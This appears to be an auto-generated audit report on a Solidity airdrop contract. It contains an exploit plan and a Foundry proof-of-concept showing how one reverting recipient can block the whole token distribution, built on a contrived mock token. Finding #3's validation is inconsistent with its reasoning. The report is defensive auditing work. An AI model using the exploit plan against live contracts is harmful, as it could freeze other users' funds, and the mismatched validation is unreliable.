# Smart Contract Vulnerability Analysis Report

**Job ID:** 51bd0d55-1e46-42de-b557-c42aef6946d1
**Date:** 2025-03-21 01:23:29

**Contract Preview:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IEligible {
    function isEligible(address user) external view returns (bool);
}

contract Airdrop {
    IERC20 immutable public token;
    IEligible immutable public eligible;
    uint256 immutable public registrationDeadline;
    
    address[] public participants;
    mapping(address => bool) public registered;
    bool public distributed;


    constructor(address _token, uint256 _registrationDeadline, address _eligible) {
...
```

## Vulnerability Summary

Found 3 potential vulnerabilities:

| # | Vulnerability Type | Confidence | Affected Functions |
|---|-------------------|------------|--------------------|
| 1 | denial_of_service | 0.70 | distribute |
| 2 | business_logic | 0.30 | constructor, register |
| 3 | business_logic | 0.20 | distribute |

## Detailed Analysis

### Vulnerability #1: denial_of_service

**Confidence:** 0.70

**Reasoning:**

The distribute() function loops over all participants and calls token.transfer for each one. If any recipient is a contract that deliberately reverts on receiving tokens (or if token.transfer itself reverts for any participant), the loop will revert entirely and block the distribution from finalizing. This opens a denial‐of‐service (DoS) attack where a malicious actor registers with a contract that always reverts on token receipt, preventing tokens from being distributed to everyone else.

**Validation:**

The distribute() function uses a for‐loop that iterates over all participants and requires each token transfer to succeed. If a single transfer (for example, to a maliciously crafted contract that reverts upon receiving tokens) fails, the entire distribution reverts, effectively locking the tokens in the contract. This is a classic denial‐of‐service risk. The issue depends on the eligibility mechanism and whether an attacker can register a problematic address. Assuming the eligibility check can be influenced or an adversary has access to eligible accounts, this is a genuine concern.

**Code Snippet:**

```solidity
function distribute() external {
        require(block.timestamp > registrationDeadline, "Distribution not started");
        require(!distributed, "Already distributed");
        uint256 totalParticipants = participants.length;
        require(totalParticipants > 0, "No participants");

        uint256 balance = token.balanceOf(address(this));
        uint256 amountPerParticipant = balance / totalParticipants;

        distributed = true;

        for (uint256 i = 0; i < totalParticipants; i++) {
            require(token.transfer(participants[i], amountPerParticipant), "Transfer failed");
        }
    }
```

**Affected Functions:** distribute

**Exploit Plan:**

*Setup Steps:*

- Step 1: Deploy a token contract and a distribution contract that includes the distribute() function.
- Step 2: Prepare multiple participant addresses, including one controlled by a malicious actor who deploys a contract that always reverts on receiving tokens.

*Execution Steps:*

- Step 1: Call distribute() under normal conditions to show tokens are transferred successfully when no malicious account is present.
- Step 2: Register the malicious actor's contract as a participant, then call distribute() and demonstrate that the transaction reverts when the malicious contract refuses the token transfer, blocking the entire distribution.

*Validation Steps:*

- Step 1: Explain that the vulnerability arises because the distribution loop relies on token.transfer success for every participant, allowing a single failure to halt the process—in effect, a denial of service attack.
- Step 2: Show potential countermeasures such as using pull-based withdrawals or handling failed transfers gracefully instead of reverting, thereby mitigating the risk of DoS attacks.

---

### Vulnerability #2: business_logic

**Confidence:** 0.30

**Reasoning:**

The constructor unconditionally calls register(), which means that whoever deploys the contract is automatically registered (subject to the eligibility check). This could potentially grant the deployer a preferential position in the participants list, allowing them to capture part of the airdropped tokens even if their eligibility isn’t externally verified in the same manner as subsequent users. This depends on the behavior of the external eligibility contract, but if misconfigured or if the deployer manages the eligible contract, it could be abused.

**Validation:**

The constructor calls register(), which results in the deployer (msg.sender) being automatically registered if the registration deadline is in the future and the eligibility check passes. While this might be unintended‐by‐design (if the deployer was not supposed to participate automatically), it does not create an exploitable security vulnerability per se. It is more of a design nuance that should be reviewed to ensure it meets the intended business logic, hence the relatively low confidence score.

**Code Snippet:**

```solidity
constructor(address _token, uint256 _registrationDeadline, address _eligible) {
        token = IERC20(_token);
        registrationDeadline = _registrationDeadline;
        eligible = IEligible(_eligible);
        register();
    }

function register() public {
        require(block.timestamp <= registrationDeadline, "Registration closed");
        require(eligible.isEligible(msg.sender), "Not eligible");
        require(!registered[msg.sender], "Already registered");
        registered[msg.sender] = true;
        participants.push(msg.sender);
    }
```

**Affected Functions:** constructor, register

---

### Vulnerability #3: business_logic

**Confidence:** 0.20

**Reasoning:**

The distribution mechanism divides the entire token balance of the contract equally among participants using integer division. This results in any remainder (due to rounding down) being left in the contract indefinitely. Moreover, the contract does not provide a mechanism for recovering or distributing these ‘leftover’ tokens. In some circumstances, if the left‐over amount is substantial or if tokens should be fully allocated, this can be seen as a flaw in business logic.

**Validation:**

The vulnerability labeled as a business logic flaw in distribute() is essentially demonstrating the same behavior as in #0. There is no additional or distinct business logic error beyond the potential DoS effect already described. Therefore, as an independent business logic issue it does not rise to a level that greatly changes the risk profile.

**Code Snippet:**

```solidity
function distribute() external {
        require(block.timestamp > registrationDeadline, "Distribution not started");
        require(!distributed, "Already distributed");
        uint256 totalParticipants = participants.length;
        require(totalParticipants > 0, "No participants");

        uint256 balance = token.balanceOf(address(this));
        uint256 amountPerParticipant = balance / totalParticipants;

        distributed = true;

        for (uint256 i = 0; i < totalParticipants; i++) {
            require(token.transfer(participants[i], amountPerParticipant), "Transfer failed");
        }
    }
```

**Affected Functions:** distribute

---

## Proof of Concept Exploits

### PoC #1: denial_of_service

**File:** /Users/advait/Desktop/NTU/fyp-fr/exploit/src/test/PoC_unknown_1742491406.sol

**Execution:** ✅ SUCCESS

**Exploit Code:**

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./basetest.sol";

/// @notice Interface for ERC20-like token transfers
interface IToken {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/// @notice Interface that malicious receivers implement to indicate they always revert on token receipt
interface IMaliciousReceiver {
    function isMalicious() external view returns (bool);
}

/// @notice A simple ERC20-like token contract with custom logic to simulate transfer failures for malicious contracts.
/// In production tokens, transfers typically don't call external contracts on recipients.
/// However, if a token uses hooks (e.g. ERC777) or if a distribution relies on the external call's return value,
/// a misbehaving recipient may cause the entire transaction to revert.
contract SimpleToken is IToken {
    string public name = "SimpleToken";
    string public symbol = "SIM";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    
    mapping (address => uint256) public balances;
    
    /// @notice Mint tokens to deployer.
    constructor(uint256 _initialSupply) {
        totalSupply = _initialSupply;
        balances[msg.sender] = _initialSupply;
    }
    
    /// @notice Standard ERC20 transfer with added simulation:
    /// If recipient is a contract and claims to be malicious (via isMalicious()),
    /// the transfer will revert. This simulates a scenario where one failing transfer
    /// causes a denial-of-service in a distribution loop.
    function transfer(address to, uint256 amount) external override returns (bool) {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        // Deduct from sender
        balances[msg.sender] -= amount;
        
        // If recipient is a contract, check for potential malicious behavior.
        if (to.code.length > 0) {
            try IMaliciousReceiver(to).isMalicious() returns (bool malicious) {
                if (malicious) {
                    revert("Token transfer rejected by malicious receiver");
                }
            } catch {
                // If call fails, assume recipient is not malicious.
            }
        }
        // Credit recipient
        balances[to] += amount;
        return true;
    }
    
    /// @notice Utility function for checking token balances.
    function balanceOf(address account) public view override returns (uint256) {
        return balances[account];
    }
}

/// @notice A distribution contract that sends tokens to a list of participants.
/// Vulnerability: The distribute() function loops over participant addresses and requires every token.transfer()
/// call to succeed. If any single transfer fails (for example, if a malicious contract reverts),
/// the entire distribution reverts, resulting in a denial-of-service (DoS) condition.
contract Distribution {
    IToken public token;
    address[] public participants;
    
    /// @notice Set token address during construction.
    constructor(address _token) {
        token = IToken(_token);
    }
    
    /// @notice Adds a participant to the distribution list.
    /// In production, ensure that only authorized callers can modify the participant list.
    function addParticipant(address participant) external {
        participants.push(participant);
    }
    
    /// @notice Distributes tokens to all participants.
    /// Vulnerability: A single failing token.transfer will revert the entire loop.
    /// Developers should consider pull-based mechanisms or handling transfer failures gracefully.
    function distribute(uint256 amountPerParticipant) external {
        uint256 len = participants.length;
        for (uint256 i = 0; i < len; i++) {
            // Check that there are sufficient tokens in this contract before transferring.
            // Using require to simulate checking for each external call's result.
            bool success = token.transfer(participants[i], amountPerParticipant);
            require(success, "Transfer failed, distribution halted");
        }
    }
    
    /// @notice Getter for participants.
    function getParticipants() external view returns (address[] memory) {
        return participants;
    }
}

/// @notice A malicious contract that simulates a receiver that always reverts on receiving tokens.
/// When the token transfer function checks for isMalicious(), this contract returns true.
contract MaliciousReceiver is IMaliciousReceiver {
    function isMalicious() external pure override returns (bool) {
        return true;
    }
}

/// @notice Foundry test contract to demonstrate the distribution vulnerability
/// Educational Purpose: To show how relying on external token.transfer() calls can lead to a DoS
/// if one participant (malicious contract) causes a transfer to revert.
contract YourTest is BaseTestWithBalanceLog {

    SimpleToken token;
    Distribution distribution;
    
    // Some dummy participant addresses (EOAs)
    address participant1;
    address participant2;
    
    // Malicious actor contract instance.
    MaliciousReceiver maliciousReceiver;
    
    // initial token supply for demonstration. Using safe value.
    uint256 constant INITIAL_SUPPLY = 1_000_000 * 1e18;
    
    // Called before each test function.
    function setUp() public {
        // Ensure the test contract has enough ETH.
        vm.deal(address(this), 100 ether);
        
        // Deploy token contract and mint tokens to this test contract.
        token = new SimpleToken(INITIAL_SUPPLY);
        
        // Deploy distribution contract with the token's address.
        distribution = new Distribution(address(token));
        
        // Transfer tokens from this test contract to the distribution contract.
        // Note: In a real scenario, appropriate access controls would be applied.
        uint256 tokensToTransfer = 500_000 * 1e18;
        bool result = token.transfer(address(distribution), tokensToTransfer);
        require(result, "Initial token transfer to distribution failed");
        
        // Prepare participant addresses.
        participant1 = address(0x1111);
        participant2 = address(0x2222);
        
        // Register normal participants in the distribution contract.
        distribution.addParticipant(participant1);
        distribution.addParticipant(participant2);
        
        // Deploy the malicious actor contract.
        maliciousReceiver = new MaliciousReceiver();
    }
    
    // Test function demonstrating the vulnerability.
    // Using the balanceLog modifier as required.
    function testExploit() public balanceLog {
        // Ensure the test contract has enough ETH.
        vm.deal(address(this), 10 ether);
        
        uint256 amountPerParticipant = 100 * 1e18;
        
        // ============================================
        // Demonstration Step 1:
        // Distribution among normal participants works correctly.
        // ============================================
        distribution.distribute(amountPerParticipant);
        
        // Validate that participant1 and participant2 received tokens.
        uint256 balance1 = token.balanceOf(participant1);
        uint256 balance2 = token.balanceOf(participant2);
        require(balance1 == amountPerParticipant, "Participant 1 did not receive the correct amount");
        require(balance2 == amountPerParticipant, "Participant 2 did not receive the correct amount");
        
        // ============================================
        // Demonstration Step 2:
        // Register the malicious contract as a participant.
        // When distribute() is called, the transfer to the malicious contract will revert,
        // blocking the entire distribution process.
        // ============================================
        distribution.addParticipant(address(maliciousReceiver));
        
        // Expect the distribution to revert due to malicious receiver rejecting the token transfer.
        vm.expectRevert(bytes("Token transfer rejected by malicious receiver"));
        distribution.distribute(amountPerParticipant);
        
        // Educational Note:
        // The vulnerability arises because the distribution loop requires every token.transfer call to succeed.
        // A single failing transfer (as simulated by the malicious contract) causes the entire loop to revert.
        // To mitigate this risk, developers can implement alternatives:
        // - Use pull-based withdrawals where recipients claim tokens.
        // - Log failed transfers and allow manual recovery instead of reverting the entire transaction.
    }
}
```

---

## Recommendations

For each identified vulnerability, consider implementing the following mitigations:

- **For All Vulnerabilities**: Consider a professional audit before deploying to production.

*This report was generated automatically by the Smart Contract Vulnerability Analyzer.*
